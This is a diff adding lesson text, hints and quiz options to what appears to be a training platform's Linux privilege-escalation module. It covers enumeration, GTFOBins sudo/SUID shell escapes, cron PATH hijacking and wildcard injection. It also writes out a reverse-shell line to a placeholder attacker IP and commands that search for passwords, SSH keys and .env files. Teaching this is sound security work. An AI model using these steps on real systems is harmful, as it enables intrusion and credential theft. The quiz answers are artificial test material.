@@ -4,43 +4,79 @@
   "tasks": {
     "1": {
       "title": "Methodology",
+      "body": "## The first rule: enumerate systematically\n\nYour first shell on Linux as a limited user. Before launching exploits blindly:\n\n```bash\n# THE LIST (from memory — your first minute on the machine)\nwhoami && id                    # who am I, which groups do I belong to\nsudo -l                         # what can I do as root?\nfind / -perm -4000 -type f 2>/dev/null   # SUID binaries\ncat /etc/crontab                # scheduled tasks\nls -la /etc/cron*               # cron scripts\nfind / -writable -type f 2>/dev/null | grep -v proc   # writable files\ncat /etc/passwd | grep -v nologin    # users with a shell\nss -tulpn                        # internal ports listening\nhistory && cat ~/.bash_history   # what did the admin do?\n```\n\n## LinPEAS: the automator\n\n```bash\n# Download it on your machine and move it to the victim\npython3 -m http.server 8080    # on your machine\nwget http://TU_IP:8080/linpeas.sh -O /tmp/linpeas.sh   # on the victim\nchmod +x /tmp/linpeas.sh && /tmp/linpeas.sh\n```\n\nLinPEAS highlights the likely vectors in RED/YELLOW. But **understand what it shows\nyou** — in a report you need to explain HOW you escalated, not just that a script\nsaid so.\n\n## The 3-step methodology (always the same)\n\n1. **Who am I and what do I have?** (id, groups, home, permissions)\n2. **What can I touch that root uses?** (SUID, sudo, cron, services, PATH)\n3. **Which tool does GTFOBins list?** (binaries with a documented bypass)\n\nGTFOBins.sh is your reference: Unix binaries that can be exploited for escalation\nwhen they have SUID or can be run with sudo.\n",
       "questions": {
         "privesc-linux-t01-q01": {
-          "prompt": "What automated script is THE standard for Linux privesc enumeration?"
+          "prompt": "What automated script is THE standard for Linux privesc enumeration?",
+          "hint": "LinPEAS. Its Windows sibling: WinPEAS."
         },
         "privesc-linux-t01-q02": {
-          "prompt": "What command shows what you can run as root without password?"
+          "prompt": "What command shows what you can run as root without password?",
+          "hint": "You already know it: sudo -l"
         },
         "privesc-linux-t01-q03": {
-          "prompt": "Why NOT run enumeration scripts blindly?"
+          "prompt": "Why NOT run enumeration scripts blindly?",
+          "hint": "Noise, false positives, and in prod it can bring services down.",
+          "options": {
+            "a": "No reason: you should always run it first",
+            "b": "It generates log noise, can overload the system, and without understanding the vectors you will not know how to exploit them",
+            "c": "Because antivirus blocks it",
+            "d": "Because it only works on Ubuntu"
+          }
         }
       }
     },
     "2": {
       "title": "SUDO and SUID",
+      "body": "## SUDO: the #1 real-world vector\n\n`sudo -l` tells you what you can run without a password. The golden rule: **if you can\nrun ANY binary that has a shell escape, you have root**.\n\n```bash\n# The GTFOBins classics (all with sudo in front):\nsudo vim -c ':!bash'                  # vim → shell\nsudo less /etc/shadow                 # less → !sh inside\nsudo find / -exec /bin/bash \\;        # find -exec\nsudo awk 'BEGIN {system(\"/bin/bash\")}' # awk system()\nsudo env /bin/bash                    # env runs a binary\nsudo nmap --interactive               # old nmap → !sh\n```\n\n**The rule**: before trying a complex exploit, check `sudo -l` + GTFOBins.sh.\n\n## SUID: the bit that grants powers\n\nYou already know SUID from CS101. Now, the exploitation:\n\n```bash\nfind / -perm -4000 -type f 2>/dev/null\n```\n\nThe SUID binaries you MUST look up in GTFOBins:\n- `find`, `vim`, `less`, `more`, `awk`, `env`, `nmap`, `bash`, `cp`, `mv`, `python`\n- Any SUID root binary that is not on the \"expected\" list (passwd, sudo,\n  ping, su, mount)\n\n```bash\n# If find is SUID root:\nfind . -exec /bin/bash -p \\;         # -p preserves the SUID bit → root bash\n\n# If python is SUID:\npython3 -c 'import os; os.execl(\"/bin/bash\",\"bash\",\"-p\")'\n```\n\n## The million-dollar question\n\nWhat if `sudo -l` shows `(root) NOPASSWD: /opt/mi_script.sh`? That script is NOT in\nGTFOBins... but what does it do? If it calls commands WITHOUT an absolute path (`tar` instead of\n`/usr/bin/tar`), you can do **PATH hijacking**: create your own `tar` in /tmp,\nmodify PATH, and when the script calls it... it runs YOUR binary as root.\n",
       "questions": {
         "privesc-linux-t02-q01": {
-          "prompt": "sudo -l shows NOPASSWD: /usr/bin/vim. How to escalate?"
+          "prompt": "sudo -l shows NOPASSWD: /usr/bin/vim. How to escalate?",
+          "hint": "Vim can run shell commands. GTFOBins: vim -c ':!bash'"
         },
         "privesc-linux-t02-q02": {
-          "prompt": "find is SUID root. What does GTFOBins say?"
+          "prompt": "find is SUID root. What does GTFOBins say?",
+          "hint": "find -exec command \\;"
         },
         "privesc-linux-t02-q03": {
-          "prompt": "Why is sudo less a privesc vector?"
+          "prompt": "Why is sudo less a privesc vector?",
+          "hint": "less has a shell escape (!cmd) — GTFOBins documents it.",
+          "options": {
+            "a": "It is not: less is harmless",
+            "b": "less (and vim, more, man) let you run commands from inside — with sudo = root shell",
+            "c": "Only if you are already root",
+            "d": "Because it reads passwords from the log"
+          }
         }
       }
     },
     "3": {
       "title": "Cron, PATH and more",
+      "body": "## Cron jobs: time runs as root\n\n```bash\ncat /etc/crontab\nls -la /etc/cron.d/ /etc/cron.daily/\n```\n\nThree vectors with cron:\n\n1. **Writable script**: if `/opt/scripts/backup.sh` is writable by your user\n   but root runs it via cron → add `bash -i >& /dev/tcp/TU_IP/4444 0>&1`.\n2. **PATH hijacking**: the script calls `tar` (without `/usr/bin/`) → create `/tmp/tar`:\n   ```bash\n   echo 'bash -i >& /dev/tcp/TU_IP/4444 0>&1' > /tmp/tar\n   chmod +x /tmp/tar\n   export PATH=/tmp:$PATH   # only if cron INHERITS your PATH (uncommon)\n   ```\n   In practice: if cron defines `PATH=/usr/local/bin:...` and `/usr/local/bin`\n   is writable → put your binary there.\n3. **Wildcard injection**: if cron runs `tar czf backup.tar.gz /var/www/*` and you can\n   create files in /var/www → create `--checkpoint=1` and `--checkpoint-action=exec=...`\n   (wildcards expand into tar flags).\n\n## Capabilities (the modern cousin of SUID)\n\n```bash\ngetcap -r / 2>/dev/null\n# cap_net_bind_service=ep → can listen on <1024\n# cap_setuid=ep → can change UID (root!)\n```\n\nA binary with `cap_setuid` that you can run is a direct escalation.\n\n## Reused credentials (the human vector)\n\n```bash\ngrep -ri \"password\" /opt/ /home/ /var/www/ --include=\"*.env\" --include=\"*.conf\" 2>/dev/null\ngrep -ri \"pass\" ~/.bash_history 2>/dev/null\nfind / -name \"*.env\" -o -name \"id_rsa\" -o -name \"*.pem\" 2>/dev/null\n```\n\nA password found in a config file is tried against: `su root`, `su admin`, other users'\nSSH, the database, the admin panel. **Password reuse is the most common vector\nin the real world** because humans are human.\n\n## Your final Linux privesc checklist\n\n```text\n□ sudo -l + GTFOBins\n□ SUID: find / -perm -4000\n□ Cron: /etc/crontab + cron.d + writables\n□ Capabilities: getcap -r /\n□ Credentials: grep -ri \"pass\" in configs + .env + history\n□ PATH: writable directories earlier in PATH\n□ Kernel: searchsploit linux kernel $(uname -r)\n```\n\nEach one has its own lab room in the path's advanced modules.\n",
       "questions": {
         "privesc-linux-t03-q01": {
-          "prompt": "A cron script calls tar without absolute path. How to escalate?"
+          "prompt": "A root cron job runs /opt/scripts/backup.sh, which calls 'tar' WITHOUT an absolute path. How do you escalate?",
+          "hint": "Think about how the system looks up a binary when its full path is not given.",
+          "options": {
+            "a": "Restart the cron service with sudo",
+            "b": "Delete /usr/bin/tar so the script fails",
+            "c": "Create a malicious tar binary in a directory that comes earlier in the cron's PATH",
+            "d": "Change the machine's hostname"
+          }
         },
         "privesc-linux-t03-q02": {
-          "prompt": "What capability allows privileged port binding?"
+          "prompt": "What capability allows privileged port binding?",
+          "hint": "cap_net_bind_service. The tool to view capabilities: getcap."
         },
         "privesc-linux-t03-q03": {
-          "prompt": "You find credentials in a config file. What do you do?"
+          "prompt": "You find credentials in a config file. What do you do?",
+          "hint": "Try credential reuse...",
+          "options": {
+            "a": "Nothing: it only works for the database",
+            "b": "Try it as the password for root and other users (password reuse is everywhere)",
+            "c": "Delete it to help out",
+            "d": "Only if it is base64"
+          }
         }
       }
     }
